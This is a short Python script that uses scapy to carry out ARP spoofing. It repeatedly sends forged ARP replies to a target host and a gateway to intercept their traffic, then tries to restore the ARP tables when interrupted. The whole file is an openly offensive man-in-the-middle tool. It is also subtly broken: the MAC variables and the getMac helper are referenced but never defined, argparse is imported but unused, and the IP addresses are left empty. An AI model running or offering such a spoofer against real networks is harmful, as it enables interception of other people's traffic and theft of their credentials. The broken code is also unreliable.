import scapy.all as scapy
import time
import argparse
import sys


def spoofer(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destinationMac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=getMac(dest_ip), psrc=source_ip, hwsrc=sourceMAC)
    scapy.send(packet, count=4, verbose=False)


packets = 0
targetIP = ""
gatewayIP =""
try:
    while True:
        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
        print("\r[+] Sent packets " + str(packets)),
        sys.stdout.flush()
        packets += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
